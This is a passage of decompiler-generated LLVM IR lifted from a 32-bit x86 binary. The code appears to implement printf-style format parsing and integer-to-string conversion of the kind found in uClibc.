  store i32 %v0_804e1a9, i32* %v3_804e1a9, align 4
  %v0_804e1aa = load i32, i32* %stack_var_-364, align 4
  %v4_804e1aa = call i32 @__stdio_fwrite(i32 %v0_804e1aa, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e1aa, i32* %eax.global-to-local, align 4
  %v0_804e1af = load i32, i32* @esp, align 4
  %v1_804e1af = add i32 %v0_804e1af, 16
  %v7_804e1af = icmp slt i32 %v1_804e1af, 0
  store i1 %v7_804e1af, i1* %sf.global-to-local, align 1
  %v1_804e1b2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e1b2

dec_label_pc_804e1b2:                             ; preds = %dec_label_pc_804e196, %dec_label_pc_804e1a0
  %v3_804e1ba = phi i32 [ %v2_804e192, %dec_label_pc_804e196 ], [ %v1_804e1b2.pre, %dec_label_pc_804e1a0 ]
  %v0_804e1b2 = phi i32 [ 0, %dec_label_pc_804e196 ], [ %v4_804e1aa, %dec_label_pc_804e1a0 ]
  %v2_804e1b2 = sub i32 %v0_804e1b2, %v3_804e1ba
  %v12_804e1b2 = icmp eq i32 %v2_804e1b2, 0
  %v13_804e1b2 = icmp slt i32 %v2_804e1b2, 0
  store i1 %v13_804e1b2, i1* %sf.global-to-local, align 1
  %v1_804e1b4 = icmp eq i1 %v12_804e1b2, false
  %v0_804e6ab.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_804e1b4, label %dec_label_pc_804e6ab, label %dec_label_pc_804e1ba

dec_label_pc_804e1ba:                             ; preds = %dec_label_pc_804e1b2
  %v1_804e1ba = inttoptr i32 %v0_804e6ab.pre.pre to i32*
  %v2_804e1ba = load i32, i32* %v1_804e1ba, align 4
  %v4_804e1ba = add i32 %v2_804e1ba, %v3_804e1ba
  %v15_804e1ba = icmp slt i32 %v4_804e1ba, 0
  store i1 %v15_804e1ba, i1* %sf.global-to-local, align 1
  store i32 %v4_804e1ba, i32* %v1_804e1ba, align 4
  %v0_804e1bd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e1bd

dec_label_pc_804e1bd:                             ; preds = %dec_label_pc_804e192, %dec_label_pc_804e1ba
  %v0_804e6a3 = phi i32 [ %v0_804e196, %dec_label_pc_804e192 ], [ %v0_804e1bd.pre, %dec_label_pc_804e1ba ]
  %v1_804e1bd = inttoptr i32 %v0_804e6a3 to i8*
  %v2_804e1bd = load i8, i8* %v1_804e1bd, align 1
  %v3_804e1bd = icmp eq i8 %v2_804e1bd, 0
  %v4_804e1bd = icmp slt i8 %v2_804e1bd, 0
  store i1 %v4_804e1bd, i1* %sf.global-to-local, align 1
  br i1 %v3_804e1bd, label %dec_label_pc_804e6b2, label %dec_label_pc_804e1c6

dec_label_pc_804e1c6:                             ; preds = %dec_label_pc_804e1bd
  %v1_804e1c6 = add i32 %v0_804e6a3, 1
  %v2_804e1c6 = inttoptr i32 %v1_804e1c6 to i8*
  %v3_804e1c6 = load i8, i8* %v2_804e1c6, align 1
  %v4_804e1c6 = add i8 %v3_804e1c6, -37
  %v12_804e1c6 = icmp eq i8 %v4_804e1c6, 0
  %v13_804e1c6 = icmp slt i8 %v4_804e1c6, 0
  store i1 %v13_804e1c6, i1* %sf.global-to-local, align 1
  store i32 %v1_804e1c6, i32* %edx.global-to-local, align 4
  br i1 %v12_804e1c6, label %dec_label_pc_804e6a3, label %dec_label_pc_804e1d3

dec_label_pc_804e1d3:                             ; preds = %dec_label_pc_804e1c6
  %v1_804e1d3 = load i32, i32* @esp, align 4
  %v2_804e1d3 = add i32 %v1_804e1d3, 16
  %v3_804e1d3 = inttoptr i32 %v2_804e1d3 to i32*
  store i32 %v1_804e1c6, i32* %v3_804e1d3, align 4
  %v0_804e1d7 = load i32, i32* @esp, align 4
  %v1_804e1d7 = add i32 %v0_804e1d7, 340
  %v2_804e1d7 = inttoptr i32 %v1_804e1d7 to i32*
  store i32 0, i32* %v2_804e1d7, align 4
  %v0_804e1e2 = load i32, i32* @esp, align 4
  %v1_804e1e2 = add i32 %v0_804e1e2, -12
  %v10_804e1e2 = icmp slt i32 %v1_804e1e2, 0
  store i1 %v10_804e1e2, i1* %sf.global-to-local, align 1
  %v1_804e1e5 = add i32 %v0_804e1e2, 16
  store i32 %v1_804e1e5, i32* @ebx, align 4
  %v2_804e1e9 = add i32 %v0_804e1e2, -16
  %v3_804e1e9 = inttoptr i32 %v2_804e1e9 to i32*
  store i32 %v1_804e1e5, i32* %v3_804e1e9, align 4
  %v0_804e1ea = load i32, i32* %stack_var_-364, align 4
  %v1_804e1ea = inttoptr i32 %v0_804e1ea to i32*
  %v2_804e1ea = call i32 @_ppfs_parsespec(i32* %v1_804e1ea)
  store i32 %v2_804e1ea, i32* %eax.global-to-local, align 4
  %v0_804e1ef = load i32, i32* @ebx, align 4
  %v1_804e1ef = load i32, i32* @esp, align 4
  %v2_804e1ef = inttoptr i32 %v1_804e1ef to i32*
  store i32 %v0_804e1ef, i32* %v2_804e1ef, align 4
  %v0_804e1f2 = load i32, i32* %stack_var_-364, align 4
  %v1_804e1f2 = call i32 @_ppfs_setargs(i32 %v0_804e1f2)
  store i32 %v1_804e1f2, i32* %eax.global-to-local, align 4
  %v0_804e1f7 = load i32, i32* @esp, align 4
  %v1_804e1f7 = add i32 %v0_804e1f7, 70
  %v2_804e1f7 = inttoptr i32 %v1_804e1f7 to i8*
  %v3_804e1f7 = load i8, i8* %v2_804e1f7, align 1
  %v4_804e1f7 = zext i8 %v3_804e1f7 to i32
  store i32 %v4_804e1f7, i32* @edi, align 4
  %v1_804e1fc = add i32 %v0_804e1f7, 16
  %v1_804e1ff = add i32 %v0_804e1f7, 56
  %v2_804e1ff = inttoptr i32 %v1_804e1ff to i32*
  %v3_804e1ff = load i32, i32* %v2_804e1ff, align 4
  %v5_804e1ff = icmp slt i32 %v3_804e1ff, 0
  store i1 %v5_804e1ff, i1* %sf.global-to-local, align 1
  %v1_804e204 = add i32 %v0_804e1f7, 112
  store i32 %v1_804e204, i32* %edx.global-to-local, align 4
  %tmp68 = icmp slt i32 %v3_804e1ff, 1
  br i1 %tmp68, label %dec_label_pc_804e211, label %dec_label_pc_804e20a

dec_label_pc_804e20a:                             ; preds = %dec_label_pc_804e1d3
  %v2_804e20a = zext i8 %v3_804e1f7 to i32
  %v3_804e20a = mul nuw nsw i32 %v2_804e20a, 12
  store i32 %v3_804e20a, i32* %eax.global-to-local, align 4
  %v2_804e20d = add i32 %v0_804e1f7, 100
  %v3_804e20d = add i32 %v2_804e20d, %v3_804e20a
  store i32 %v3_804e20d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e211

dec_label_pc_804e211:                             ; preds = %dec_label_pc_804e1d3, %dec_label_pc_804e20a
  %v0_804e21929 = phi i32 [ %v1_804e204, %dec_label_pc_804e1d3 ], [ %v3_804e20d, %dec_label_pc_804e20a ]
  %v1_804e211 = add i32 %v0_804e1f7, 60
  %v2_804e211 = inttoptr i32 %v1_804e211 to i32*
  %v3_804e211 = load i32, i32* %v2_804e211, align 4
  store i32 %v3_804e211, i32* %ecx.global-to-local, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804e22474 = sub i32 0, %v3_804e211
  %v10_804e22477 = and i32 %v3_804e211, %v2_804e22474
  %v11_804e22478 = icmp slt i32 %v10_804e22477, 0
  %v13_804e22479 = icmp slt i32 %v2_804e22474, 0
  %v2_804e22680 = icmp eq i1 %v13_804e22479, %v11_804e22478
  br i1 %v2_804e22680, label %dec_label_pc_804e228, label %dec_label_pc_804e219

dec_label_pc_804e219:                             ; preds = %dec_label_pc_804e211, %dec_label_pc_804e219
  %v0_804e22884 = phi i32 [ %v0_804e228, %dec_label_pc_804e219 ], [ %v1_804e1fc, %dec_label_pc_804e211 ]
  %v2_804e21983 = phi i32 [ %v1_804e223, %dec_label_pc_804e219 ], [ 0, %dec_label_pc_804e211 ]
  %v0_804e21982 = phi i32 [ %v1_804e220, %dec_label_pc_804e219 ], [ %v0_804e21929, %dec_label_pc_804e211 ]
  %v3_804e219 = mul i32 %v2_804e21983, 4
  %v4_804e219 = add i32 %v3_804e219, 344
  %v5_804e219 = add i32 %v4_804e219, %v0_804e22884
  %v6_804e219 = inttoptr i32 %v5_804e219 to i32*
  store i32 %v0_804e21982, i32* %v6_804e219, align 4
  %v0_804e220 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e220 = add i32 %v0_804e220, 12
  store i32 %v1_804e220, i32* %edx.global-to-local, align 4
  %v0_804e223 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e223 = add i32 %v0_804e223, 1
  %v1_804e224.pre = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v1_804e223, i32* %eax.global-to-local, align 4
  %v2_804e224 = sub i32 %v1_804e223, %v1_804e224.pre
  %v8_804e224 = xor i32 %v1_804e223, %v1_804e224.pre
  %v9_804e224 = xor i32 %v2_804e224, %v1_804e223
  %v10_804e224 = and i32 %v9_804e224, %v8_804e224
  %v11_804e224 = icmp slt i32 %v10_804e224, 0
  %v13_804e224 = icmp slt i32 %v2_804e224, 0
  %v2_804e226 = icmp eq i1 %v13_804e224, %v11_804e224
  %v0_804e228 = load i32, i32* @esp, align 4
  br i1 %v2_804e226, label %dec_label_pc_804e228, label %dec_label_pc_804e219

dec_label_pc_804e228:                             ; preds = %dec_label_pc_804e219, %dec_label_pc_804e211
  %v0_804e228.lcssa = phi i32 [ %v1_804e1fc, %dec_label_pc_804e211 ], [ %v0_804e228, %dec_label_pc_804e219 ]
  %v1_804e228 = add i32 %v0_804e228.lcssa, 48
  %v2_804e228 = inttoptr i32 %v1_804e228 to i32*
  %v3_804e228 = load i32, i32* %v2_804e228, align 4
  store i32 %v3_804e228, i32* %ecx.global-to-local, align 4
  %v1_804e22c = icmp eq i32 %v3_804e228, 0
  %v2_804e22c = icmp slt i32 %v3_804e228, 0
  store i1 %v2_804e22c, i1* %sf.global-to-local, align 1
  %v1_804e22e = icmp eq i1 %v1_804e22c, false
  br i1 %v1_804e22e, label %dec_label_pc_804e256, label %dec_label_pc_804e230

dec_label_pc_804e230:                             ; preds = %dec_label_pc_804e228
  %v1_804e230 = inttoptr i32 %v0_804e228.lcssa to i32*
  %v2_804e230 = load i32, i32* %v1_804e230, align 4
  store i32 %v2_804e230, i32* %eax.global-to-local, align 4
  %v1_804e233 = ashr i32 %v2_804e230, 31
  store i32 %v1_804e233, i32* %edx.global-to-local, align 4
  %v2_804e234 = add i32 %v0_804e228.lcssa, -4
  %v3_804e234 = inttoptr i32 %v2_804e234 to i32*
  store i32 %v1_804e233, i32* %v3_804e234, align 4
  %v0_804e235 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e235 = add i32 %v0_804e228.lcssa, -8
  %v3_804e235 = inttoptr i32 %v2_804e235 to i32*
  store i32 %v0_804e235, i32* %v3_804e235, align 4
  %v1_804e236 = add i32 %v0_804e228.lcssa, 32
  %v2_804e236 = inttoptr i32 %v1_804e236 to i32*
  %v3_804e236 = load i32, i32* %v2_804e236, align 4
  %v1_804e23a = and i32 %v3_804e236, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_804e23a, i32* %eax.global-to-local, align 4
  %v2_804e23f = add i32 %v0_804e228.lcssa, -12
  %v3_804e23f = inttoptr i32 %v2_804e23f to i32*
  store i32 %v1_804e23a, i32* %v3_804e23f, align 4
  %v1_804e240 = add i32 %v0_804e228.lcssa, 344
  %v2_804e240 = inttoptr i32 %v1_804e240 to i32*
  %v3_804e240 = load i32, i32* %v2_804e240, align 4
  store i32 %v3_804e240, i32* %eax.global-to-local, align 4
  %v1_804e247 = inttoptr i32 %v3_804e240 to i32*
  %v2_804e247 = load i32, i32* %v1_804e247, align 4
  %v4_804e247 = add i32 %v0_804e228.lcssa, -16
  %v5_804e247 = inttoptr i32 %v4_804e247 to i32*
  store i32 %v2_804e247, i32* %v5_804e247, align 4
  %v0_804e249 = call i32 @_store_inttype()
  store i32 %v0_804e249, i32* %eax.global-to-local, align 4
  %v0_804e24e = load i32, i32* @esp, align 4
  %v1_804e24e = add i32 %v0_804e24e, 16
  %v7_804e24e = icmp slt i32 %v1_804e24e, 0
  store i1 %v7_804e24e, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804e698

dec_label_pc_804e256:                             ; preds = %dec_label_pc_804e228
  %v1_804e256 = add i32 %v3_804e228, -7
  %v5_804e256 = icmp ult i32 %v3_804e228, 7
  %v9_804e256 = icmp eq i32 %v1_804e256, 0
  %v10_804e256 = icmp slt i32 %v1_804e256, 0
  store i1 %v10_804e256, i1* %sf.global-to-local, align 1
  %v2_804e259 = or i1 %v5_804e256, %v9_804e256
  br i1 %v2_804e259, label %dec_label_pc_804e25f, label %dec_label_pc_804e3c3

dec_label_pc_804e25f:                             ; preds = %dec_label_pc_804e256
  %v1_804e25f = add i32 %v3_804e228, 134548440
  %v2_804e25f = inttoptr i32 %v1_804e25f to i8*
  %v3_804e25f = load i8, i8* %v2_804e25f, align 1
  %v4_804e25f = sext i8 %v3_804e25f to i32
  store i32 %v4_804e25f, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_804e26b = icmp eq i8 %v3_804e25f, 10
  %v10_804e26b = icmp slt i8 %v3_804e25f, 10
  store i1 %v10_804e26b, i1* %sf.global-to-local, align 1
  %v1_804e26e = icmp eq i1 %v9_804e26b, false
  br i1 %v1_804e26e, label %dec_label_pc_804e28e, label %dec_label_pc_804e270

dec_label_pc_804e270:                             ; preds = %dec_label_pc_804e25f
  %v1_804e270 = add i32 %v0_804e228.lcssa, 32
  %v2_804e270 = inttoptr i32 %v1_804e270 to i32*
  %v3_804e270 = load i32, i32* %v2_804e270, align 4
  store i32 %v3_804e270, i32* %eax.global-to-local, align 4
  %v1_804e276 = udiv i32 %v3_804e270, 32
  %tmp69 = urem i32 %v1_804e276, 2
  %tmp70 = sub nsw i32 45, %tmp69
  %v2_804e286 = or i32 %tmp70, 128
  store i32 %v2_804e286, i32* %edx.global-to-local, align 4
  %v2_804e289 = and i32 %v3_804e270, 64
  %v3_804e289 = icmp eq i32 %v2_804e289, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804e28b = icmp eq i1 %v3_804e289, false
  %v4_804e28b = select i1 %v1_804e28b, i32 %v2_804e286, i32 %tmp70
  store i32 %v4_804e28b, i32* @ebx, align 4
  br label %dec_label_pc_804e28e

dec_label_pc_804e28e:                             ; preds = %dec_label_pc_804e25f, %dec_label_pc_804e270
  %v1_804e28e = add i32 %v3_804e228, -5
  %v5_804e28e = icmp ult i32 %v3_804e228, 5
  %v9_804e28e = icmp eq i32 %v1_804e28e, 0
  %v10_804e28e = icmp slt i32 %v1_804e28e, 0
  store i1 %v10_804e28e, i1* %sf.global-to-local, align 1
  %v2_804e291 = or i1 %v5_804e28e, %v9_804e28e
  br i1 %v2_804e291, label %dec_label_pc_804e293, label %dec_label_pc_804e2ab

dec_label_pc_804e293:                             ; preds = %dec_label_pc_804e28e
  %v1_804e293 = add i32 %v3_804e228, -3
  %v9_804e293 = icmp eq i32 %v1_804e293, 0
  %v10_804e293 = icmp slt i32 %v1_804e293, 0
  store i1 %v10_804e293, i1* %sf.global-to-local, align 1
  %v1_804e296 = icmp eq i1 %v9_804e293, false
  br i1 %v1_804e296, label %dec_label_pc_804e29f, label %dec_label_pc_804e298

dec_label_pc_804e298:                             ; preds = %dec_label_pc_804e293
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_804e2ad

dec_label_pc_804e29f:                             ; preds = %dec_label_pc_804e293
  %v1_804e29f = add i32 %v3_804e228, -1
  %v9_804e29f = icmp eq i32 %v1_804e29f, 0
  %v10_804e29f = icmp slt i32 %v1_804e29f, 0
  store i1 %v10_804e29f, i1* %sf.global-to-local, align 1
  br i1 %v9_804e29f, label %dec_label_pc_804e2b2, label %dec_label_pc_804e2ad

dec_label_pc_804e2ab:                             ; preds = %dec_label_pc_804e28e
  %v1_804e2ab = sub nsw i32 0, %v4_804e25f
  %v7_804e2ab = icmp sgt i8 %v3_804e25f, 0
  store i1 %v7_804e2ab, i1* %sf.global-to-local, align 1
  store i32 %v1_804e2ab, i32* @esi, align 4
  br label %dec_label_pc_804e2ad

dec_label_pc_804e2ad:                             ; preds = %dec_label_pc_804e29f, %dec_label_pc_804e298, %dec_label_pc_804e2ab
  br label %dec_label_pc_804e2b2

dec_label_pc_804e2b2:                             ; preds = %dec_label_pc_804e29f, %dec_label_pc_804e2ad
  %storemerge = phi i32 [ 11, %dec_label_pc_804e2ad ], [ 6, %dec_label_pc_804e29f ]
  store i32 %storemerge, i32* @ebp, align 4
  %v1_804e2b2 = add i32 %v0_804e228.lcssa, 20
  %v2_804e2b2 = inttoptr i32 %v1_804e2b2 to i32*
  %v3_804e2b2 = load i32, i32* %v2_804e2b2, align 4
  %v5_804e2b2 = icmp slt i32 %v3_804e2b2, 0
  store i1 %v5_804e2b2, i1* %sf.global-to-local, align 1
  %v1_804e2b7 = add i32 %v0_804e228.lcssa, 7
  %v2_804e2b7 = inttoptr i32 %v1_804e2b7 to i8*
  store i8 32, i8* %v2_804e2b7, align 1
  %v0_804e2bc = load i1, i1* %sf.global-to-local, align 1
  %v1_804e2bc = icmp eq i1 %v0_804e2bc, false
  br i1 %v1_804e2bc, label %dec_label_pc_804e2c6, label %dec_label_pc_804e2be

dec_label_pc_804e2be:                             ; preds = %dec_label_pc_804e2b2
  %v0_804e2be = load i32, i32* @esp, align 4
  %v1_804e2be = add i32 %v0_804e2be, 36
  %v2_804e2be = inttoptr i32 %v1_804e2be to i8*
  %v3_804e2be = load i8, i8* %v2_804e2be, align 1
  %v4_804e2be = zext i8 %v3_804e2be to i32
  %v5_804e2be = load i32, i32* %edx.global-to-local, align 4
  %v6_804e2be = and i32 %v5_804e2be, -256
  %v7_804e2be = or i32 %v6_804e2be, %v4_804e2be
  store i32 %v7_804e2be, i32* %edx.global-to-local, align 4
  %v3_804e2c2 = add i32 %v0_804e2be, 7
  %v4_804e2c2 = inttoptr i32 %v3_804e2c2 to i8*
  store i8 %v3_804e2be, i8* %v4_804e2c2, align 1
  br label %dec_label_pc_804e2c6

dec_label_pc_804e2c6:                             ; preds = %dec_label_pc_804e2b2, %dec_label_pc_804e2be
  %v1_804e2c6 = add i32 %v3_804e228, -1
  %v8_804e2c6 = icmp eq i32 %v1_804e2c6, 0
  %v9_804e2c6 = icmp slt i32 %v1_804e2c6, 0
  store i1 %v9_804e2c6, i1* %sf.global-to-local, align 1
  store i32 %v1_804e2c6, i32* %ecx.global-to-local, align 4
  %v0_804e2c7 = load i32, i32* @esp, align 4
  %v1_804e2c7 = add i32 %v0_804e2c7, 344
  %v2_804e2c7 = inttoptr i32 %v1_804e2c7 to i32*
  %v3_804e2c7 = load i32, i32* %v2_804e2c7, align 4
  store i32 %v3_804e2c7, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v0_804e2df.pre = load i32, i32* @edi, align 4
  br i1 %v8_804e2c6, label %dec_label_pc_804e2df, label %dec_label_pc_804e2d5

dec_label_pc_804e2d5:                             ; preds = %dec_label_pc_804e2c6
  %v2_804e2d5 = mul i32 %v0_804e2df.pre, 4
  %v3_804e2d5 = add i32 %v0_804e2c7, 52
  %v4_804e2d5 = add i32 %v3_804e2d5, %v2_804e2d5
  %v5_804e2d5 = inttoptr i32 %v4_804e2d5 to i32*
  %v6_804e2d5 = load i32, i32* %v5_804e2d5, align 4
  %v1_804e2d9 = and i32 %v6_804e2d5, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_804e2d9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e2df

dec_label_pc_804e2df:                             ; preds = %dec_label_pc_804e2c6, %dec_label_pc_804e2d5
  %v2_804e2df = add i32 %v0_804e2c7, -4
  %v3_804e2df = inttoptr i32 %v2_804e2df to i32*
  store i32 %v0_804e2df.pre, i32* %v3_804e2df, align 4
  %v0_804e2e0 = load i32, i32* @esi, align 4
  %v2_804e2e0 = add i32 %v0_804e2c7, -8
  %v3_804e2e0 = inttoptr i32 %v2_804e2e0 to i32*
  store i32 %v0_804e2e0, i32* %v3_804e2e0, align 4
  %v0_804e2e1 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e2e1 = add i32 %v0_804e2c7, -12
  %v3_804e2e1 = inttoptr i32 %v2_804e2e1 to i32*
  store i32 %v0_804e2e1, i32* %v3_804e2e1, align 4
  %v0_804e2e2 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e2e2 = add i32 %v0_804e2c7, -16
  %v3_804e2e2 = inttoptr i32 %v2_804e2e2 to i32*
  store i32 %v0_804e2e2, i32* %v3_804e2e2, align 4
  %v0_804e2e3 = call i32 @_load_inttype()
  %v0_804e2e8 = load i32, i32* @ebx, align 4
  %v1_804e2e8 = load i32, i32* @esp, align 4
  %v2_804e2e8 = inttoptr i32 %v1_804e2e8 to i32*
  store i32 %v0_804e2e8, i32* %v2_804e2e8, align 4
  %v0_804e2eb = load i32, i32* @esi, align 4
  %v1_804e2eb = load i32, i32* @esp, align 4
  %v2_804e2eb = add i32 %v1_804e2eb, -4
  %v3_804e2eb = inttoptr i32 %v2_804e2eb to i32*
  store i32 %v0_804e2eb, i32* %v3_804e2eb, align 4
  %v0_804e2ec = load i32, i32* @edx, align 4
  %v2_804e2ec = add i32 %v1_804e2eb, -8
  %v3_804e2ec = inttoptr i32 %v2_804e2ec to i32*
  store i32 %v0_804e2ec, i32* %v3_804e2ec, align 4
  %v2_804e2ed = add i32 %v1_804e2eb, -12
  %v3_804e2ed = inttoptr i32 %v2_804e2ed to i32*
  store i32 %v0_804e2e3, i32* %v3_804e2ed, align 4
  %v1_804e2ee = add i32 %v1_804e2eb, 347
  store i32 %v1_804e2ee, i32* %eax.global-to-local, align 4
  %v2_804e2f5 = add i32 %v1_804e2eb, -16
  %v3_804e2f5 = inttoptr i32 %v2_804e2f5 to i32*
  store i32 %v1_804e2ee, i32* %v3_804e2f5, align 4
  %v0_804e2f6 = load i32, i32* %stack_var_-364, align 4
  %v5_804e2f6 = inttoptr i32 %v0_804e2f6 to i8*
  %v6_804e2f6 = call i32 @_uintmaxtostr(i8* %v5_804e2f6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804e2f6, i32* %eax.global-to-local, align 4
  %v0_804e2fb = load i32, i32* @esp, align 4
  %v1_804e2fb = add i32 %v0_804e2fb, 32
  %v1_804e2fe = add i32 %v0_804e2fb, 80
  %v2_804e2fe = inttoptr i32 %v1_804e2fe to i32*
  %v3_804e2fe = load i32, i32* %v2_804e2fe, align 4
  %v4_804e2fe = add i32 %v3_804e2fe, -5
  %v8_804e2fe = icmp ult i32 %v3_804e2fe, 5
  %v12_804e2fe = icmp eq i32 %v4_804e2fe, 0
  %v13_804e2fe = icmp slt i32 %v4_804e2fe, 0
  store i1 %v13_804e2fe, i1* %sf.global-to-local, align 1
  store i32 %v6_804e2f6, i32* @edi, align 4
  %v2_804e305 = or i1 %v8_804e2fe, %v12_804e2fe
  br i1 %v2_804e305, label %dec_label_pc_804e32f, label %dec_label_pc_804e307

dec_label_pc_804e307:                             ; preds = %dec_label_pc_804e2df
  %v7_804e2f6 = inttoptr i32 %v6_804e2f6 to i8*
  %v3_804e307 = load i8, i8* %v7_804e2f6, align 1
  %v4_804e307 = add i8 %v3_804e307, -45
  %v12_804e307 = icmp eq i8 %v4_804e307, 0
  %v13_804e307 = icmp slt i8 %v4_804e307, 0
  store i1 %v13_804e307, i1* %sf.global-to-local, align 1
  %v1_804e30a = icmp eq i1 %v12_804e307, false
  %v1_804e319 = add i32 %v0_804e2fb, 64
  %v2_804e319 = inttoptr i32 %v1_804e319 to i32*
  %v3_804e319 = load i32, i32* %v2_804e319, align 4
  br i1 %v1_804e30a, label %dec_label_pc_804e319, label %dec_label_pc_804e30c

dec_label_pc_804e30c:                             ; preds = %dec_label_pc_804e307
  %v4_804e30c = or i32 %v3_804e319, 2
  store i32 %v4_804e30c, i32* %v2_804e319, align 4
  %v0_804e311 = load i32, i32* @edi, align 4
  %v1_804e311 = add i32 %v0_804e311, 1
  %v9_804e311 = icmp slt i32 %v1_804e311, 0
  store i1 %v9_804e311, i1* %sf.global-to-local, align 1
  store i32 %v1_804e311, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_804e32f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e32f

dec_label_pc_804e319:                             ; preds = %dec_label_pc_804e307
  store i32 %v3_804e319, i32* %eax.global-to-local, align 4
  %v2_804e31d = and i32 %v3_804e319, 2
  %v3_804e31d = icmp eq i32 %v2_804e31d, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v3_804e31d, label %dec_label_pc_804e325, label %dec_label_pc_804e321

dec_label_pc_804e321:                             ; preds = %dec_label_pc_804e319
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804e32f

dec_label_pc_804e325:                             ; preds = %dec_label_pc_804e319
  %v2_804e325 = urem i32 %v3_804e319, 2
  %v3_804e325 = icmp eq i32 %v2_804e325, 0
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 4, i32* %eax.global-to-local, align 4
  %v1_804e32c = icmp eq i1 %v3_804e325, false
  %v2_804e32c = load i32, i32* @ebp, align 4
  %v4_804e32c = select i1 %v1_804e32c, i32 4, i32 %v2_804e32c
  store i32 %v4_804e32c, i32* @ebp, align 4
  br label %dec_label_pc_804e32f

dec_label_pc_804e32f:                             ; preds = %dec_label_pc_804e2df, %dec_label_pc_804e321, %dec_label_pc_804e30c, %dec_label_pc_804e325
  %v0_804e381 = phi i32 [ %v6_804e2f6, %dec_label_pc_804e2df ], [ %v6_804e2f6, %dec_label_pc_804e321 ], [ %v1_804e311, %dec_label_pc_804e30c ], [ %v6_804e2f6, %dec_label_pc_804e325 ]
  %v0_804e391 = phi i32 [ %v1_804e2fb, %dec_label_pc_804e2df ], [ %v1_804e2fb, %dec_label_pc_804e321 ], [ %v0_804e32f.pre, %dec_label_pc_804e30c ], [ %v1_804e2fb, %dec_label_pc_804e325 ]
  %v1_804e32f = add i32 %v0_804e391, 20
  %v2_804e32f = inttoptr i32 %v1_804e32f to i32*
  %v3_804e32f = load i32, i32* %v2_804e32f, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_804e333 = sub i32 204, %v0_804e381
  %v2_804e33f = add i32 %v1_804e333, %v0_804e391
  %v1_804e341 = add i32 %v2_804e33f, 127
  store i32 %v1_804e341, i32* @esi, align 4
  %v2_804e344 = icmp slt i32 %v3_804e32f, 0
  store i1 %v2_804e344, i1* %sf.global-to-local, align 1
  %v3_804e346 = select i1 %v2_804e344, i32 1, i32 %v3_804e32f
  store i32 %v3_804e346, i32* %ecx.global-to-local, align 4
  %v1_804e349 = add i32 %v0_804e391, 32
  %v2_804e349 = inttoptr i32 %v1_804e349 to i8*
  %v3_804e349 = load i8, i8* %v2_804e349, align 1
  %v4_804e349 = and i8 %v3_804e349, 16
  %v5_804e349 = icmp eq i8 %v4_804e349, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v5_804e349, label %dec_label_pc_804e381, label %dec_label_pc_804e350

dec_label_pc_804e350:                             ; preds = %dec_label_pc_804e32f
  %v1_804e350 = add i32 %v0_804e391, 48
  %v2_804e350 = inttoptr i32 %v1_804e350 to i32*
  %v3_804e350 = load i32, i32* %v2_804e350, align 4
  store i32 %v3_804e350, i32* %edx.global-to-local, align 4
  store i32 6, i32* %eax.global-to-local, align 4
  %tmp71 = icmp ult i32 %v3_804e350, 3
  %v3_804e359 = load i32, i32* @ebp, align 4
  %v5_804e359 = select i1 %tmp71, i32 6, i32 %v3_804e359
  store i32 %v5_804e359, i32* @ebp, align 4
  %v1_804e35c = add i32 %v3_804e350, -3
  %v9_804e35c = icmp eq i32 %v1_804e35c, 0
  %v10_804e35c = icmp slt i32 %v1_804e35c, 0
  store i1 %v10_804e35c, i1* %sf.global-to-local, align 1
  %v1_804e35f = icmp eq i1 %v9_804e35c, false
  br i1 %v1_804e35f, label %dec_label_pc_804e368, label %dec_label_pc_804e361

dec_label_pc_804e361:                             ; preds = %dec_label_pc_804e350
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_804e381

dec_label_pc_804e368:                             ; preds = %dec_label_pc_804e350
  %v1_804e368 = add i32 %v3_804e350, -4
  %v9_804e368 = icmp eq i32 %v1_804e368, 0
  %v10_804e368 = icmp slt i32 %v1_804e368, 0
  store i1 %v10_804e368, i1* %sf.global-to-local, align 1
  %v1_804e36b = icmp eq i1 %v9_804e368, false
  br i1 %v1_804e36b, label %dec_label_pc_804e381, label %dec_label_pc_804e36d

dec_label_pc_804e36d:                             ; preds = %dec_label_pc_804e368
  %v2_804e36d = sub i32 %v3_804e346, %v1_804e341
  %v7_804e36d = icmp ult i32 %v3_804e346, %v1_804e341
  %v12_804e36d = icmp eq i32 %v2_804e36d, 0
  %v13_804e36d = icmp slt i32 %v2_804e36d, 0
  store i1 %v13_804e36d, i1* %sf.global-to-local, align 1
  %v2_804e36f = or i1 %v7_804e36d, %v12_804e36d
  br i1 %v2_804e36f, label %dec_label_pc_804e371, label %dec_label_pc_804e381

dec_label_pc_804e371:                             ; preds = %dec_label_pc_804e36d
  %v1_804e371 = inttoptr i32 %v0_804e381 to i8*
  %v2_804e371 = load i8, i8* %v1_804e371, align 1
